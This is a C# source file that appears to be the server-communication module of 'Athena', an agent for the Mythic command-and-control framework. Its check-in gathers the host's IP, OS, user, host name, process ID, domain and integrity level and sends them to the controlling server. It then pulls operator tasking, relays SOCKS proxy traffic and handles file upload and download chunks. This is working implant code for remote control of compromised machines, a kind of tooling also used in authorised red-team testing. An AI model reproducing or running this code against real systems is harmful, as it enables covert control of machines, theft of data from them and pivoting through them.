using Athena.Config;
using Athena.Models.Mythic.Checkin;
using Athena.Models.Mythic.Tasks;
using Athena.Models.Mythic.Response;
using Athena.Utilities;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Threading.Tasks;
using Athena.Commands;

namespace Athena
{
    public class MythicClient
    {
        public MythicConfig MythicConfig { get; set; }
        public CommandHandler commandHandler { get; set; }
        public MythicClient()
        {
            this.MythicConfig = new MythicConfig();
            this.commandHandler = new CommandHandler();
        }

        #region Communication Functions      
        /// <summary>
        /// Performa  check-in with the Mythic server
        /// </summary>
        public async Task<CheckinResponse> CheckIn()
        {
            Checkin ct = new Checkin()
            {
                action = "checkin",
                ip = Dns.GetHostEntry(Dns.GetHostName()).AddressList[0].ToString(),
                os = Environment.OSVersion.ToString(),
                user = Environment.UserName,
                host = Dns.GetHostName(),
                pid = Process.GetCurrentProcess().Id.ToString(),
                uuid = this.MythicConfig.uuid,
                architecture = await Misc.GetArch(),
                domain = Environment.UserDomainName,
                integrity_level = Misc.getIntegrity(),
            };

            try
            {
                var responseString = await this.MythicConfig.currentConfig.Send(ct);

                if (String.IsNullOrEmpty(responseString))
                {
                    return null;
                }
                CheckinResponse cs = JsonConvert.DeserializeObject<CheckinResponse>(responseString);
                if (cs is null)
                {
                    cs = new CheckinResponse()
                    {
                        status = "failed",
                    };
                }
                return cs;
            }
            catch (Exception e)
            {
                return new CheckinResponse();
            }
        }

        /// <summary>
        /// Perform a get tasking action with the Mythic server to return current responses and check for new tasks
        /// </summary>
        /// <param name="jobs">List of MythicJobs</param>
        /// <param name="delegateMessages">List of DelegateMessages</param>
        /// <param name="socksMessage">List of SocksMessages</param>
        public async Task<List<MythicTask>> GetTasks(List<object> responses, List<DelegateMessage> delegateMessages, List<SocksMessage> socksMessage)
        {
            //List<ResponseResult> responseResults = GetResponses(jobs);
            GetTasking gt = new GetTasking()
            {
                action = "get_tasking",
                tasking_size = -1,
                delegates = delegateMessages,
                socks = socksMessage,
                responses = responses
            };

            try
            {
                string responseString = this.MythicConfig.currentConfig.Send(gt).Result;

                if (String.IsNullOrEmpty(responseString))
                {
                    return null;
                }

                return await HandleGetTaskingResponse(responseString);
            }
            catch (Exception e)
            {
                return null;
            }
        }
        #endregion
        #region Helper Functions

        /// <summary>
        /// Parse the GetTaskingResponse and forward them to the required places
        /// </summary>
        /// <param name="responseString">Response from the Mythic server</param>
        private async Task<List<MythicTask>> HandleGetTaskingResponse(string responseString)
        {
            GetTaskingResponse gtr = JsonConvert.DeserializeObject<GetTaskingResponse>(responseString);
            if (gtr is null)
            {
                return null;
            }

            if (gtr.delegates is not null && gtr.delegates.Count > 0)
            {
                try
                {
                    HandleDelegates(gtr.delegates);
                }
                catch (Exception e)
                {

                }
            }
            //Pass up socks messages
            if (gtr.socks is not null && gtr.socks.Count > 0)
            {
                try
                {
                    HandleSocks(gtr.socks);
                }
                catch (Exception e)
                {

                }
            }
            if (gtr.responses is not null)
            {
                try
                {
                    HandleMythicResponses(gtr.responses);
                }
                catch (Exception e)
                {
                }
            }
            return gtr.tasks;
        }

        /// <summary>
        /// Handles SOCKS messages received from the Mythic server
        /// </summary>
        /// <param name="socks">List of SocksMessages</param>
        private async Task HandleSocks(List<SocksMessage> socks)
        {
            //I can have multiple socks messages for the same connection ID
            foreach(var sock in socks){
                await Globals.socksHandler.HandleMessage(sock);
            }
        }

        /// <summary>
        /// Handle delegate messages received from the Mythic server
        /// </summary>
        /// <param name="delegates">List of DelegateMessages</param>
        private async Task HandleDelegates(List<DelegateMessage> delegates)
        {
            Parallel.ForEach(delegates, async del =>
            {
                await Globals.mc.MythicConfig.forwarder.ForwardDelegateMessage(del);
            });
        }

        /// <summary>
        /// Handle response result messages received from the Mythic server
        /// </summary>
        /// <param name="responses">List of MythicResponseResults</param>
        private async Task HandleMythicResponses(List<MythicResponseResult> responses)
        {
            Parallel.ForEach(responses, async response =>
            {
                if (await this.commandHandler.HasUploadJob(response.task_id))
                {
                    await this.commandHandler.HandleUploadPiece(response);
                }

                if (await this.commandHandler.HasDownloadJob(response.task_id))
                {
                    await this.commandHandler.HandleDownloadPiece(response);
                }
            });
        }
        #endregion
    }
}
